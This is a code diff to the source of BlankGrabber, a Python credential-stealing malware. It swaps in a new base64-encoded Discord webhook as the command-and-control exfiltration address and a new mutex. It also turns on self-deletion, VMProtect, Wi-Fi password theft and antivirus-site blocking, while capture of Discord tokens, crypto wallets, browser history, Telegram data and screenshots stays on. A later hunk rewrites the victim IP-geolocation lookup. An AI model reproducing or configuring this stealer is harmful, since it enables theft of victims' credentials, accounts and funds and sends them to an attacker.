@@ -21,12 +21,12 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NjU0MTM5MDA3ODY3Mjk2MC9SY0tmMC1qdzRpQjM5bkZ1VHpheVpvRURTTk1iYlBrX1p6Z3FWVHhiRWZfRzBJQjJ3TG5sUlJJcC1aTkdjZUhxamhtNw==').decode())
-    Mutex = base64.b64decode('WWdKWFFJNXJZTU9xblp0Rw==').decode()
+    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNzc0Nzc0MDUwNzQzOTI2NS9SLVRxanpuRW40Y0FxRmdoMUgyNlRvdEFwaTNRSVY2MTJva3R5Y3JoZ3pxejZ3b0J0dlFzUjVOQ3U5blJvSWNKeGdydQ==').decode())
+    Mutex = base64.b64decode('cEZBMXhxcVY4V2E0aVBMTw==').decode()
     PingMe = bool('true')
-    Vmprotect = bool('')
+    Vmprotect = bool('true')
     Startup = bool('')
-    Melt = bool('')
+    Melt = bool('true')
     UacBypass = bool('')
     ArchivePassword = base64.b64decode('YmxhbmsxMjM=').decode()
     HideConsole = bool('true')
@@ -39,14 +39,14 @@ class Settings:
     CaptureHistory = bool('true')
     CaptureDiscordTokens = bool('true')
     CaptureGames = bool('true')
-    CaptureWifiPasswords = bool('')
+    CaptureWifiPasswords = bool('true')
     CaptureSystemInfo = bool('true')
     CaptureScreenshot = bool('true')
     CaptureTelegram = bool('true')
     CaptureCommonFiles = bool('true')
     CaptureWallets = bool('true')
     FakeError = (bool(''), ('', '', '0'))
-    BlockAvSites = bool('')
+    BlockAvSites = bool('true')
     DiscordInjection = bool('true')
 if not hasattr(sys, '_MEIPASS'):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
@@ -1316,28 +1316,10 @@ class BlankGrabber:
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
         http = PoolManager(cert_reqs='CERT_NONE')
         try:
-            r: dict = json.loads(
-                http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
+            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
             if r.get('status') != 'success':
                 raise Exception('Failed')
-
-            query = r['query']
-            region = r['regionName']
-            country = r['country']
-            timezone = r['timezone']
-            mobile = r['mobile']
-            proxy = r['proxy']
-
-            # Compute the formatted strings separately
-            cellular_label = 'Cellular Network:'.ljust(20)
-            cellular_status = chr(9989) if mobile else chr(10062)
-            proxy_label = 'Proxy/VPN:'.ljust(20)
-            proxy_status = chr(9989) if proxy else chr(10062)
-
-            # Use the computed values in the f-string
-            data = (f'\nIP: {query}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}'
-                    f'\n\n{cellular_label} {cellular_status}\n{proxy_label} {proxy_status}')
-
+            data = f'\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}'
             if len(r['reverse']) != 0:
                 data += f'\nReverse DNS: {r['reverse']}'
         except Exception:
